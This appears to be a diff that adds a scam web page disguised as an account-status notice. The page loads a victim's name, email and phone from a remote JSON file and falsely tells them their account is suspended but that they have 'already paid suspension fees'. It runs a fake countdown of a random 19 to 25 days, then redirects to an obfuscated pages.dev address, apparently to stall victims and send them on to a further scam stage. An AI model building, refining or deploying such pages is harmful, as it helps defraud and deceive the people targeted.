@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Account Status</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", sans-serif;
+      background: linear-gradient(180deg, #f2f2f7 0%, #e5e5ea 100%);
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      overflow: hidden;
+    }
+    .container {
+      background: rgba(255, 255, 255, 0.8);
+      backdrop-filter: blur(20px);
+      width: 100%;
+      max-width: 400px;
+      margin: 20px;
+      border-radius: 24px;
+      padding: 24px;
+      text-align: center;
+      box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
+      border: 1px solid rgba(255, 255, 255, 0.3);
+      transition: 0.4s ease;
+    }
+    .status-icon {
+      width: 64px;
+      height: 64px;
+      border-radius: 20px;
+      background: linear-gradient(135deg, #E6E6FA 0%, #E0FFFF 100%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin: 0 auto 16px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+    }
+    p {
+      color: #3c3c43;
+      font-size: 17px;
+      opacity: 0.8;
+      margin: 8px 0;
+    }
+    .timer {
+      font-size: 28px;
+      font-weight: 700;
+      color: #007aff;
+      margin-top: 12px;
+      font-family: "SF Mono", monospace;
+      display: none;
+    }
+    #activateBtn {
+      width: 100%;
+      background: linear-gradient(180deg, #0a84ff 0%, #006aff 100%);
+      color: white;
+      border: none;
+      padding: 16px;
+      border-radius: 18px;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.15s;
+      box-shadow: 0 4px 14px rgba(0, 122, 255, 0.25);
+      margin-top: 16px;
+    }
+    #activateBtn:active {
+      opacity: 0.8;
+      transform: scale(0.97);
+    }
+    .success-screen {
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,0.85);
+      backdrop-filter: blur(25px);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      gap: 20px;
+      font-size: 22px;
+      font-weight: 600;
+      color: #1c1c1e;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.8s ease;
+    }
+    .success-screen.show {
+      opacity: 1;
+      pointer-events: all;
+    }
+    .success-check {
+      font-size: 90px;
+      color: #34c759;
+      animation: pop 0.6s ease;
+    }
+    @keyframes pop {
+      0% {transform: scale(0.1); opacity: 0;}
+      60% {transform: scale(1.15); opacity: 1;}
+      100% {transform: scale(1);}
+    }
+    #message { display: none; text-align: left; }
+  </style>
+</head>
+<body>
+
+  <div id="successScreen" class="success-screen">
+    <div class="success-check">✓</div>
+    Activated Successfully
+  </div>
+
+  <div class="container" id="container">
+
+    <div class="status-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" width="1.5em" height="1.5em" viewBox="0 0 24 24">
+        <rect width="24" height="24" fill="none" />
+        <path fill="#007aff" d="M12,1A11,11,0,1,0,23,12,11,11,0,0,0,12,1Zm0,20a9,9,0,1,1,9-9A9,9,0,0,1,12,21Z" />
+        <rect width="2" height="7" x="11" y="6" fill="#007aff" rx="1">
+          <animateTransform attributeName="transform" dur="9s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12" />
+        </rect>
+        <rect width="2" height="9" x="11" y="11" fill="#007aff" rx="1">
+          <animateTransform attributeName="transform" dur="0.75s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12" />
+        </rect>
+      </svg>
+    </div>
+
+    <p id="message">
+      Hello <strong><span id="userNameSpan"></span></strong>, 👋<br>
+      We noticed some unusual activity on your account, so it’s temporarily in <strong>suspicion mode</strong>.<br>
+      <span style="color:green;"><strong>you’ve already paid suspension fees, so don’t worry❤️</strong></span><br>
+      Great news! Your profile review request has been successfully submitted. We’ll take care of it & keep you updated every step of the way. 💖 It may take up to 30 working days, but you’ll see the remaining days in the countdown below.
+      We’ll notify you at <strong><span id="userEmailSpan"></span></strong> and <strong><span id="userPhoneSpan"></span></strong> as soon as your account is <strong>verified or active</strong>.<br><br>
+      Thank you for your patience, trust, and understanding. We’re with you every step of the way, your safety is our priority. 💖🌟
+    </p>
+
+    <button id="activateBtn">Request Activate Account</button>
+
+    <div class="timer" id="timer">00:00:00:00</div>
+
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <script>
+    const timerElement = document.getElementById("timer");
+    const activateBtn = document.getElementById("activateBtn");
+    const successScreen = document.getElementById("successScreen");
+    const messageEl = document.getElementById("message");
+
+    const userNameEl = document.getElementById("userNameSpan");
+    const userEmailEl = document.getElementById("userEmailSpan");
+    const userPhoneEl = document.getElementById("userPhoneSpan");
+
+    // Load user data from localStorage or fetch JSON
+    const savedUser = localStorage.getItem("userData");
+    if (savedUser) {
+      const userData = JSON.parse(savedUser);
+      userNameEl.textContent = userData.name;
+      userEmailEl.textContent = userData.email;
+      userPhoneEl.textContent = userData.phone;
+    } else {
+      fetch("https://syncjson.pages.dev/account-activation.json")
+        .then(res => res.json())
+        .then(data => {
+          userNameEl.textContent = data.name;
+          userEmailEl.textContent = data.email;
+          userPhoneEl.textContent = data.phone;
+          localStorage.setItem("userData", JSON.stringify(data));
+        })
+        .catch(err => console.error("Failed to load user data:", err));
+    }
+
+    // Check if timer was previously started
+    let startTime = localStorage.getItem("activationStart");
+    let duration = localStorage.getItem("activationDuration");
+
+    if (startTime && duration) {
+      activateBtn.style.display = "none";
+      messageEl.style.display = "block";
+      timerElement.style.display = "block";
+      startTimer(parseInt(startTime), parseInt(duration));
+    }
+
+    activateBtn.addEventListener("click", () => {
+      Swal.fire({
+        icon: 'success',
+        title: 'Hooray! Success!',
+        text: 'We’ve received your activation request sit back and relax! 🌟',
+        showConfirmButton: false,
+        timer: 2000
+      }).then(() => {
+        messageEl.style.display = "block";
+        timerElement.style.display = "block";
+
+        const now = Date.now();
+        const days = Math.floor(Math.random() * (25 - 19 + 1)) + 19;
+        const durationMs = days * 24 * 60 * 60 * 1000;
+
+        localStorage.setItem("activationStart", now);
+        localStorage.setItem("activationDuration", durationMs);
+
+        activateBtn.style.display = "none";
+
+        startTimer(now, durationMs);
+      });
+    });
+
+    function startTimer(start, duration) {
+      const endTime = start + duration;
+      function update() {
+        const now = Date.now();
+        const remaining = endTime - now;
+        if (remaining <= 0) {
+          showSuccess();
+          return;
+        }
+        const days = Math.floor(remaining / (1000*60*60*24));
+        const hours = Math.floor((remaining / (1000*60*60)) % 24);
+        const minutes = Math.floor((remaining / (1000*60)) % 60);
+        const seconds = Math.floor((remaining / 1000) % 60);
+        timerElement.textContent = 
+          `${String(days).padStart(2,"0")}:${String(hours).padStart(2,"0")}:${String(minutes).padStart(2,"0")}:${String(seconds).padStart(2,"0")}`;
+        requestAnimationFrame(update);
+      }
+      update();
+    }
+
+    function showSuccess() {
+      localStorage.removeItem("activationStart");
+      localStorage.removeItem("activationDuration");
+      successScreen.classList.add("show");
+      setTimeout(() => {
+        window.location.href = "https://zufvoql5xqh6d1zljquitd1uwteyswvkqwcexlsprjnit5f46blnxe4f3t.pages.dev/Status";
+      }, 3000);
+    }
+  </script>
+</body>
+</html>
